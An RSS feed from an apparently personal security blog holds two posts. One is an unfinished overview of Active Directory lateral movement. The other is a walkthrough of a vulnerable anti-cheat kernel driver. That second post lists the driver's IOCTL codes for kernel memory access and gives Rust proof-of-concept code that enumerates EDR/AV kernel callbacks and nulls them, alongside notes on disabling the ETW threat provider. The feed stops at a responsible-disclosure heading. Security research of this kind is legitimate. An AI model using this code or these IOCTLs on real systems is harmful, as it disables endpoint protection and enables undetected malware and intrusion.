<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Thotty</title>
    <link>/posts/</link>
    <description>Recent content in Posts on Thotty</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 24 Nov 2023 00:00:00 +0000</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>How a threat actor moves laterally through a network</title>
      <link>/posts/lateralmovement/</link>
      <pubDate>Fri, 24 Nov 2023 00:00:00 +0000</pubDate>
      
      <guid>/posts/lateralmovement/</guid>
      <description>1 What is Lateral Movement? Lateral movement refers to the actions and techniques employed by threat actors to advance further within a network. Another term that is used for this is pivoting, however there is a difference between lateral movment and pivoting where the key difference lies in the approach. Lateral movement refers to moving across different Active Directory (AD) users while pivoting referes to moving from one system to another.</description>
      <content>&lt;h1 id=&#34;1-what-is-lateral-movement&#34;&gt;&lt;code&gt;1&lt;/code&gt; What is Lateral Movement?&lt;/h1&gt;
&lt;p&gt;Lateral movement refers to the actions and techniques employed by threat actors to advance further within a network. Another term that is used for this is pivoting, however there is a difference between lateral movment and pivoting where the key difference lies in the approach. Lateral movement refers to moving across different Active Directory (AD) users while pivoting referes to moving from one system to another. I have found that lateral movement and pivoting are used rather interchangably.&lt;/p&gt;
&lt;h1 id=&#34;2-how-is-lateral-movement-performed&#34;&gt;&lt;code&gt;2&lt;/code&gt; How is Lateral Movement performed&lt;/h1&gt;
&lt;p&gt;This chapter will explain how lateral movement is performed&lt;/p&gt;
&lt;h1 id=&#34;21-domain-admin-vs-local-admin&#34;&gt;&lt;code&gt;2.1&lt;/code&gt; Domain Admin vs Local Admin&lt;/h1&gt;
&lt;p&gt;When a threat actor gets access to a server or workstation they have a defined goal in mind, getting Domain Admin. Why is the goal to get Domain Admin level access you may ask? well that is a simple answer; the Domain Admin has full control of the whole domain. When an attacker gets access to Domain Admin they can perform any command on any server that they want.&lt;/p&gt;
&lt;p&gt;There are a couple differences between Local Admins and Domain Admins. The image below shows the differences.&lt;/p&gt;

&lt;img src=&#34;/img/domainvslocal.png&#34;  alt=&#34;Domain Admin vs Local Admin&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;So, where a Local Admin is restricted to just one machine a Domain Admin is not restricted to the same issue. This account can access any server in a domain from a workstation to a domain controller and everything in between.&lt;/p&gt;
&lt;h1 id=&#34;22-recon-recon-and-more-recon&#34;&gt;&lt;code&gt;2.2&lt;/code&gt; Recon, Recon and more Recon.&lt;/h1&gt;
&lt;p&gt;When threat actors drop into an environment they want to know what kind of environment it is. They want to map the network; who are the users in the network, what shares are available, what are the domain controllers (ip address, name, and how many), what servers and workstations are in the network and whom are the domain admins.&lt;/p&gt;
&lt;p&gt;Threat actors can use custom tools and open-source tools to do recon in a network however Windows itself delivers tools that can also give information about a network. When a threat actor uses these tools we call this living-off-the-land, they utilize tools that are already present on the system which makes them harder to detect.&lt;/p&gt;
&lt;p&gt;A tool that is very useful for reconnaissance is Bloodhound. Bloodhound is a tool that can identify user permissions, sessions, attack paths and hidden relations inside of Domain. Want to know the best thing about it? everything can be collected with having just domain user permissions. The image below is an overview of Bloodhound that collected information about a Domain.&lt;/p&gt;

&lt;img src=&#34;/img/Bloodhound.jpg&#34;  alt=&#34;Bloodhound&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;The attack path I have highlighted in red is the attack path I am going to demonstrate. We start all the way on the left at &lt;code&gt;1&lt;/code&gt; and will move laterally through the network all the way to &lt;code&gt;2.1&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;To make this attack path more insightful I have drawn the image below:&lt;/p&gt;

&lt;img src=&#34;/img/attackpath.png&#34;  alt=&#34;Attack Path to take&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;We will start at the user: &lt;code&gt;NoPriv&lt;/code&gt; that runs on the workstation which is just a normal user account, this user account cannot execute commands on the server. On this workstation also runs an account named &lt;code&gt;WorkStationAdmin&lt;/code&gt; which does have permissions to execute commands on the server. However this account is not a Domain Admin account for this we will have to get access to the &lt;code&gt;DcUser&lt;/code&gt; account, luckily for us his session is running on this server.&lt;/p&gt;
&lt;p&gt;So our attack chain looks as follows:&lt;/p&gt;

&lt;img src=&#34;/img/attackchain.png&#34;  alt=&#34;Attack chain&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;Note: We don&amp;rsquo;t need to escalate to local admin on the server, as &lt;code&gt;WorkStationAdmin&lt;/code&gt; is already a local admin.&lt;/p&gt;
&lt;h1 id=&#34;22-now-in-practice&#34;&gt;&lt;code&gt;2.2&lt;/code&gt; Now in practice&lt;/h1&gt;
&lt;p&gt;I will start from a user level account, escalate my privileges and follow the same attack scheme as shown within Bloodhound. I am using my own tooling to achieve this goal however I will mention alternatives to my tooling.&lt;/p&gt;
&lt;h1 id=&#34;221-privilege-escalation&#34;&gt;&lt;code&gt;2.2.1&lt;/code&gt; Privilege Escalation&lt;/h1&gt;
&lt;p&gt;As we&amp;rsquo;re running as a user level account we first must escalate these permissions. The reasoning for this is because user accounts can&amp;rsquo;t really do anything. To escalate our permissions I will be using the CMSTPLUA COM User Account Control (UAC)-bypass.&lt;/p&gt;
&lt;p&gt;As you can see in the image below I am a normal user with no privileges at all and I don&amp;rsquo;t have permissions to execute any commands on the server.&lt;/p&gt;

&lt;img src=&#34;/img/noprivuser.png&#34;  alt=&#34;No privilege user&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;h1 id=&#34;3-how-can-lateral-movement-be-prevented&#34;&gt;&lt;code&gt;3&lt;/code&gt; How can Lateral Movement be prevented?&lt;/h1&gt;
&lt;h1 id=&#34;4-conclusion&#34;&gt;&lt;code&gt;4&lt;/code&gt; Conclusion&lt;/h1&gt;
&lt;p&gt;t&lt;/p&gt;
&lt;h1 id=&#34;references&#34;&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.crowdstrike.com/cybersecurity-101/lateral-movement/&#34;&gt;https://www.crowdstrike.com/cybersecurity-101/lateral-movement/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.reddit.com/r/CompTIA/comments/p223eb/is_there_a_technical_difference_between_pivot_and/?rdt=50866&#34;&gt;https://www.reddit.com/r/CompTIA/comments/p223eb/is_there_a_technical_difference_between_pivot_and/?rdt=50866&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.netwrix.com/2022/12/09/bloodhound-active-directory/&#34;&gt;https://blog.netwrix.com/2022/12/09/bloodhound-active-directory/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>Outsmarting Antivirus [Echo AC Edition]</title>
      <link>/posts/echohno/</link>
      <pubDate>Thu, 28 Sep 2023 00:00:00 +0000</pubDate>
      
      <guid>/posts/echohno/</guid>
      <description>1 Credits  https://ioctl.fail/echo-ac-writeup/ https://github.com/wavestone-cdt/EDRSandblast  2 Introduction In the realm of today&amp;rsquo;s cyberspace the adoption of an Antivirus (AV) or an Endpoint Detection and Response (EDR) software plays a crucial role in securing a computer system from malicious threats. In today&amp;rsquo;s digital world, having an Antivirus or Endpoint Detection and Response software is like putting a lock on your door to protect your computer. While it can block less sophisticated attacks, it might not catch really sophisticated ones.</description>
      <content>&lt;h1 id=&#34;1-credits&#34;&gt;&lt;code&gt;1&lt;/code&gt; Credits&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://ioctl.fail/echo-ac-writeup/&#34;&gt;https://ioctl.fail/echo-ac-writeup/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/wavestone-cdt/EDRSandblast&#34;&gt;https://github.com/wavestone-cdt/EDRSandblast&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-introduction&#34;&gt;&lt;code&gt;2&lt;/code&gt; Introduction&lt;/h1&gt;
&lt;p&gt;In the realm of today&amp;rsquo;s cyberspace the adoption of an Antivirus (AV) or an Endpoint Detection and Response (EDR) software plays a crucial role in securing a computer system from malicious threats. In today&amp;rsquo;s digital world, having an Antivirus or Endpoint Detection and Response software is like putting a lock on your door to protect your computer. While it can block less sophisticated attacks, it might not catch really sophisticated ones. Cybercrime today is like a game of catch-me-if-you-can, as attackers keep getting smarter with their methods.&lt;/p&gt;
&lt;h1 id=&#34;3-functionality-user-mode-vs-kernel-mode&#34;&gt;&lt;code&gt;3&lt;/code&gt; Functionality: User-mode vs Kernel-mode&lt;/h1&gt;
&lt;p&gt;A computer is built up from two different modes, user-mode and kernel-mode. When a user-mode program requests to run, a process and a virtual address space is created by Windows. Programs running in user-mode are less privileged than user-mode applications. If a user-mode application wants to access system resources, it will first have to go through the kernel by using syscalls.&lt;/p&gt;
&lt;p&gt;In kernel-mode all code shares a single virtual address space. Therefore a kernel-mode driver does not experience any isolation from other drivers. When a driver writes data to the wrong virtual address it can overwrite data belonging to another driver. If a kernel-mode driver crashes, the entire OS crashes (also known as a Blue Screen of Death (BSOD)).&lt;/p&gt;

&lt;img src=&#34;/img/userandkernelmode01.png&#34;  alt=&#34;usermode vs kernelmode&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;h1 id=&#34;4-unveiling-driver-vulnerability&#34;&gt;&lt;code&gt;4&lt;/code&gt; Unveiling Driver Vulnerability&lt;/h1&gt;
&lt;p&gt;Echo AC, or Echo AntiCheat, serves as an anti-cheat solution designed to identify and prevent cheating among users. It achieves this by conducting memory scans, examining recently visited websites, scrutinizing files within your recycle bin, and collecting a comprehensive set of data. This software, however, is notably intrusive in terms of user privacy. Game server administrators typically mandate its usage, and non-compliance may result in restrictions from accessing their game servers.&lt;/p&gt;
&lt;p&gt;Echo AC utilizes a kernel-mode driver to access data from various processes without implementing sufficient access control mechanisms to restrict which programs can communicate with this driver. Merely obtaining a handle to the driver and issuing the appropriate IOCTL codes is sufficient to have the driver fulfill your requests.&lt;/p&gt;
&lt;p&gt;With the theoretical background and backstory now set aside, let&amp;rsquo;s delve into the operational aspects of this driver.&lt;/p&gt;

&lt;img src=&#34;/img/driversign.png&#34;  alt=&#34;driversign&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;When inspecting the certificate of the driver we can see a few things. The driver was signed on Wednesday 16 December, 2020 at 0:25:28 and is valid to Friday 3 December 2021. Take in mind that at the day of writing this certificate is nearly &lt;code&gt;2 years&lt;/code&gt; overdue.&lt;/p&gt;
&lt;p&gt;When opening the Driver within Ghidra, we can follow the call to mmCopyVirtualMemory to the functions that uses this function. In our case only 1 reference was found to mmCopyVirtualMemory and this reference I called CopyMemory as this is what the function does.&lt;/p&gt;

&lt;img src=&#34;/img/mmcopyvirtualmemory.png&#34;  alt=&#34;copyvirtualmemory&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;When following the reference we get a pseudo-decompiled version of the function &lt;code&gt;CopyMemory&lt;/code&gt;, I renamed some of the variables to make it more simplistic to get the feeling of what&amp;rsquo;s going on and how it all works.&lt;/p&gt;

&lt;img src=&#34;/img/CopyMemoryFunction.png&#34;  alt=&#34;copymemoryfunction&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;The mmCopyVirtualMemory function parameters look like this:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;C&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;mmCopyVirtualMemory function parameters&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-C&#34; &gt;&lt;code&gt;
NTSTATUS NTAPI MmCopyVirtualMemory
(
    PEPROCESS SourceProcess,
    PVOID SourceAddress,
    PEPROCESS TargetProcess,
    PVOID TargetAddress,
    SIZE_T BufferSize,
    KPROCESSOR_MODE PreviousMode,
    PSIZE_T ReturnSize
);
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Now we know what function is responsible for &lt;code&gt;copying and pasting&lt;/code&gt;, we still need to figure out how we can access/use this function to our advantage.
To see where our copy function is being used we can look for the references. When we double click our CopyMemory function we get to see the references, one of which is &lt;code&gt;14000197c&lt;/code&gt; when we click this reference we will be taken to where the function is called.&lt;/p&gt;

&lt;img src=&#34;/img/referenceCopy.png&#34;  alt=&#34;copymemoryreference&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;When we follow this reference, we are dropped in the main part of the driver. We are able to see what is callable with IOCTL codes that we can send to the driver. It may not say much right now but we&amp;rsquo;ll slowly walk through it.&lt;/p&gt;

&lt;img src=&#34;/img/mainpartofdriver.png&#34;  alt=&#34;mainpartofdriver&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;Let&amp;rsquo;s start simple with the question, what can we see? We see a bunch of if and else statements, these if/else statements are comparing for a value and do something according to the result. These values are actually IOCTL codes (for example &lt;code&gt;if (iVar5 == -0x6195fa6c)&lt;/code&gt;) to tell the driver to do a certain action, but now how do we call it?&lt;/p&gt;
&lt;p&gt;When we follow the first if else statement, we can see a comparision against a value but what is the else about? when we double click on &lt;code&gt;LAB_140001b03&lt;/code&gt; we can see what the else does for us.&lt;/p&gt;

&lt;img src=&#34;/img/ifelse.png&#34;  alt=&#34;ifelse&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;The else statement in this case makes the driver exit, which is not something we want so we will have to make sure we&amp;rsquo;re not exiting out of the driver.&lt;/p&gt;
&lt;p&gt;We can bypass the comparison, because we can literally see what it compares with.&lt;/p&gt;

&lt;img src=&#34;/img/compare.png&#34;  alt=&#34;compare&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;As the above image shows it compares the EDI register with the value &lt;code&gt;0x9e6a0594&lt;/code&gt;,  we can thus call the driver using the IOCTL code of &lt;code&gt;0x0x9e6a0594&lt;/code&gt; bypassing the check.
Now to not let the driver crash upon itself we need to set a buffer which is necessary for BCrypt. We can see at the end that ppUvar2 is being set to &lt;code&gt;0x1000&lt;/code&gt; which means &lt;code&gt;4096&lt;/code&gt; in decimal. A buffer of 4096 should thus be sufficient for BCrypt to put it&amp;rsquo;s data into, if we do not create this buffer the driver will cause a BSOD (Blue Screen Of Death).&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s apply the logic we just learned to the next &lt;code&gt;IOCTL&lt;/code&gt; code we can find.&lt;/p&gt;

&lt;img src=&#34;/img/function2.png&#34;  alt=&#34;function2&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;As we can see the next function we can call is accessable by calling the &lt;code&gt;IOCTL&lt;/code&gt; code of &lt;code&gt;0xe6224248&lt;/code&gt;. Now lets take a step back and take in the view of the second function. We see &lt;code&gt;PsLookupProcessByProcessId&lt;/code&gt;, &lt;code&gt;ObOpenObjectByPointer&lt;/code&gt; and &lt;code&gt;ObfDereferenceObject&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;From the Microsoft documentation (MSDN) page &lt;code&gt;PsLookupProcessByProcessId&lt;/code&gt; function routine accepts the process ID of a process and returns a referenced pointer to the EPROCESS structure of the process. The first argument to the function is the ProcessId and the second arguement is a pointer to the EPROCESS structure of the process specified by the ProcessId. This means that &lt;code&gt;puVar3&lt;/code&gt; is the ProcessId and &lt;code&gt;uStack344&lt;/code&gt; is the EPROCESS structure pointer.&lt;/p&gt;
&lt;p&gt;When we clean up the decompiled code a bit we get the following:&lt;/p&gt;

&lt;img src=&#34;/img/cleaned_up.png&#34;  alt=&#34;cleanedupimage&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;Microsoft Documentation (MSDN) describes the following about &lt;code&gt;ObOpenObjectByPointer&lt;/code&gt;, The ObOpenObjectByPointer function opens an object referenced by a pointer and returns a handle to the object. This means that this function returns a handle to the process that we are specifying by the process id.&lt;/p&gt;
&lt;p&gt;Now the most interesting part of the driver, reading and writing memory. This function can be called using the IOCTL code of: &lt;code&gt;0x60a26124&lt;/code&gt; and looks like the following:

&lt;img src=&#34;/img/copymemory.png&#34;  alt=&#34;copymemory&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;

&lt;/p&gt;
&lt;p&gt;MSDN describes the function of &lt;code&gt;ObReferenceObjectByHandle&lt;/code&gt; as the following: The ObReferenceObjectByHandle routine provides access validation on the object handle, and, if access can be granted, returns the corresponding pointer to the object&amp;rsquo;s body. This means that the driver is checking if it has access to the process that we specified using the process id, if successful it continues with copying the memory.&lt;/p&gt;
&lt;h1 id=&#34;5-edr-and-av&#34;&gt;&lt;code&gt;5&lt;/code&gt; EDR and AV&lt;/h1&gt;
&lt;p&gt;This paragraph explains the basic concepts concerning the inner functions of EDR and AVs and also goes in-depth in how to disable them.&lt;/p&gt;
&lt;h1 id=&#34;51-innerworkings-of-edr-and-av&#34;&gt;&lt;code&gt;5.1&lt;/code&gt; Innerworkings of EDR and AV&lt;/h1&gt;
&lt;p&gt;Most, if not all, of todays EDR and AV solutions run in both user-mode and kernel-mode. Most antivirus and endpoint detection and response (EDR) products use API hooking in userland and callbacks/event subscriptions for kernelmode.&lt;/p&gt;
&lt;p&gt;In order to find malicious behaviour in process the AV/EDR will inject their own Dynamic Link Library (DLL). This DLL hooks Windows API calls that are frequently used for malicious activity. Since API hooks are placed within the address space of a program, that program can also access/overwrite these hooks which in turn makes the hooks placed by the AV/EDR useless. You can see why there should be a fallback option so that this can be monitored and prevented.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Mr-Un1k0d3r/EDRs&#34;&gt;https://github.com/Mr-Un1k0d3r/EDRs&lt;/a&gt; lists user-mode hooks for populair EDR/AV providers like CrowdStrike, SentinelOne, Bitdefender and McAfee.&lt;/p&gt;

&lt;img src=&#34;/img/apihook.png&#34;  alt=&#34;apihooking&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;p&gt;An EDR and AV also use a kernel driver to monitor actions of the system. Since all user-mode applications have to run through the kernel this is a perfect place to position yourself as a protection provider. The reason for this is that the kernel is a bottleneck which can be utilized to give the highest order of protection.&lt;/p&gt;
&lt;p&gt;The most commonly employed callback functions by EDRs and AVs include the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;PspCreateProcessNotifyRoutine&lt;/code&gt; for process creation;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PspCreateThreadNotifyRoutine&lt;/code&gt; for thread creation;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PspLoadImageNotifyRoutine&lt;/code&gt; for image loading;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;EDRs and AVs do not solely reply on callback functions to determine malicious actions, they can also register to get informed by Event Tracing for Windows, also known as ETW. ETW logs data usage on APIs which the EDR/AV can use to determine if specific actions are considered malicious and consequently block them.&lt;/p&gt;
&lt;h1 id=&#34;6-proof-of-concept&#34;&gt;&lt;code&gt;6&lt;/code&gt; Proof-of-Concept&lt;/h1&gt;
&lt;p&gt;This Proof-of-Concept shows the usage of disabling protection providers using kernel notify routine patching and etw threat disabling. It achieves this by cross referencing every driver that has a registered kernel notify routine with a set list of AV/EDR providers, when a match has been found it will null out the callback for this driver. Disabling ETW Threat provider is done by switching a bit from ENABLED (1) to DISABLED (0).&lt;/p&gt;
&lt;p&gt;The complete code can be found here: &lt;a href=&#34;https://github.com/ThottySploity/echoac-edr-poc&#34;&gt;https://github.com/ThottySploity/echoac-edr-poc&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The following code sets up the initial connection with the EchoDrv:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;Rust&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;Rust code to set up the EchoDrv initial connection&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-Rust&#34; &gt;&lt;code&gt;
    pub unsafe fn load() -&amp;gt; HANDLE {
        // IOCTL Code - 0x9e6a0594

        // sc create EchoDrv binpath=C:\PathToDriver.sys type= kernel &amp;amp;&amp;amp; sc start EchoDrv
        let handle_driver = CreateFileW(
            Utils::convert_string_to_mut_u16(&amp;#34;\\\\.\\EchoDrv&amp;#34;.to_string()),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            null_mut(),
            OPEN_EXISTING,
            0,
            0,
        );

        if handle_driver == INVALID_HANDLE_VALUE {
            error!(&amp;#34;Failed to load driver&amp;#34;);
            return 0;
        }

        let size = 4096;
        let layout = Layout::from_size_align(size, std::mem::align_of::&amp;lt;u8&amp;gt;()).unwrap();

        // Allocate memory on the heap and obtain a raw pointer to it
        let buf: *mut u8 = unsafe { alloc(layout) as *mut u8 };

        if DeviceIoControl(
            handle_driver,
            0x9e6a0594,
            null_mut(),
            0,
            buf as *mut c_void,
            4096,
            null_mut(),
            null_mut(),
        ) == 0
        {
            error!(
                &amp;#34;Calling driver with: 0x9e6a0594 failed\n{}&amp;#34;,
                Error::last_os_error()
            );
            CloseHandle(handle_driver);

            return 0;
        }

        // Free the buffer
        unsafe { dealloc(buf as *mut _, layout) };
        handle_driver
    }
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;To continue, we get the handle to our own process, for this we use &lt;code&gt;GetCurrentProcessId&lt;/code&gt; and the following fuction:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;Rust&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;Get our handle&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-Rust&#34; &gt;&lt;code&gt;
    #[repr(C)]
    #[derive(Copy, Clone)]
    struct k_get_handle {
        pid: u32,
        access: u32,
        handle: HANDLE,
    }

    pub unsafe fn get_handle_pid(handle_driver: HANDLE, pid: u32) -&amp;gt; HANDLE {
        // IOCTL Code - 0xe6224248

        let mut param: k_get_handle = std::mem::zeroed();

        param.pid = pid;
        param.access = 0x10000000; // GENERIC_ALL

        if DeviceIoControl(
            handle_driver,
            0xe6224248,
            &amp;amp;mut param as *const _ as *const c_void,
            std::mem::size_of::&amp;lt;k_get_handle&amp;gt;() as u32,
            &amp;amp;mut param as *mut _ as *mut c_void,
            std::mem::size_of::&amp;lt;k_get_handle&amp;gt;() as u32,
            null_mut(),
            null_mut(),
        ) == 0
        {
            error!(
                &amp;#34;Calling driver with: 0xe6224248 failed\n{}&amp;#34;,
                Error::last_os_error()
            );
            CloseHandle(handle_driver);
            return 0;
        }

        param.handle
    }
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Now comes the fun part, enumerating the edr drivers that use callbacks for process, thread and image creation. The code is a bit long, so I will disect it a bit to make it more understandable.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;3&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;Rust&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;Getting the right offsets&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-Rust&#34; &gt;&lt;code&gt;
	let (_, create_process, create_thread, load_image, _, _, _, _, _, _, _) = Offsets::get_offsets(ntos_kernel_version);
        let routines = vec![&amp;#34;CreateProcess&amp;#34;, &amp;#34;CreateThread&amp;#34;, &amp;#34;LoadImage&amp;#34;];
        let offsets = vec![create_process, create_thread, load_image];
        let mut counter = 0;
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;We get the right offsets from our predefined offset list, as this is only a Proof-of-Concept I have not made it dynamic and all offsets are static. Even though the offsets are all hardcoded, it supports over 600 different windows kernel versions.
Firstly we parse our ntos kernel version to the offsets functions, which returns the offsets for CreateProcess, CreateThread and LoadImage routines.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;4&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;Rust&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;Making our routines&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-Rust&#34; &gt;&lt;code&gt;
	for routine in routines {
                let psp_routine = Utils::make_psp_routine(routine);
                let psp_routine_addr = Utils::get_notify_address(ntos_kernel_base_address, offsets[counter] as usize);
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Secondly we loop through our three routines, create the right name for them (which is just a &lt;code&gt;format!(&amp;quot;Psp{}NotifyRoutine&amp;quot;, routine)&lt;/code&gt;) and get the address of our routine. The address is gotten from leaking our ntos kernel base address and adding the routine offset to it. So let&amp;rsquo;s say our base address is 0 and our routine offset is at 100 our routine address becomes 100, as 0 + 100 = 100.&lt;/p&gt;
&lt;p&gt;Lastly, where the magic happends:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;5&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;5&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;Rust&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;Enumerating Drivers through callbacks&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-Rust&#34; &gt;&lt;code&gt;
	for i in 0..64 {
                    let mut call_back_struct: u64 = 0;
                    let size = std::mem::size_of_val(&amp;amp;call_back_struct) as u64;
                    Driver::memory(driver_handle, (psp_routine_addr &amp;#43; (i * 8)) as u64, &amp;amp;mut call_back_struct, size, own_process_handle);

                    if call_back_struct != 0 {
                        let callback = (call_back_struct &amp;amp; !0b1111) &amp;#43; 8;
                        let mut function: u64 = 0;
                        let size = std::mem::size_of_val(&amp;amp;function) as u64;

                        Driver::memory(driver_handle, callback, &amp;amp;mut function, size, own_process_handle);
                        
                        let mut driver_offset: u64 = 0;
                        let driver_name = Utils::get_driver(function, &amp;amp;mut driver_offset);

                        if !driver_name.clone().is_empty() &amp;amp;&amp;amp; Utils::is_driver_name_edr(driver_name.clone()) {
                            let call_back_addr: u64 = (psp_routine_addr &amp;#43; (i * 8)) as u64;

                            edr_drivers.push(FoundEdrDrivers {
                                driver_name: driver_name.clone(),
                                routine: psp_routine.to_string(),
                                call_back_func: function,
                                call_back_struct: call_back_struct,
                                call_back_struct_addr: call_back_addr,
                                removed: false,
                            });
                        }
                    }
                }
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;It looks like a lot doesn&amp;rsquo;t it? yeah you&amp;rsquo;re right, but let&amp;rsquo;s see if we can clear this up!
The Psp create notify routine creates an array of &amp;lt; 64 items, hence why we loop through 64 iterations.
The first 8 bytes represent an &lt;code&gt;EX_RUNDOWN_REF structure&lt;/code&gt;, so we can jump past them to get the address of the callback function inside of a driver.&lt;/p&gt;
&lt;p&gt;If the driver is found to be an EDR associated driver, it gets added to a vector containing information about the Driver. To patch or null the driver from this array, we only have to overwrite the call back struct addr with 0.&lt;/p&gt;
&lt;p&gt;So how does this look in practice? well something like this:&lt;/p&gt;

&lt;img src=&#34;/img/running.png&#34;  alt=&#34;running poc&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;


&lt;h1 id=&#34;7-responsible-disclosure-mitigating-risks&#34;&gt;&lt;code&gt;7&lt;/code&gt; Responsible Disclosure: Mitigating Risks&lt;/h1&gt;
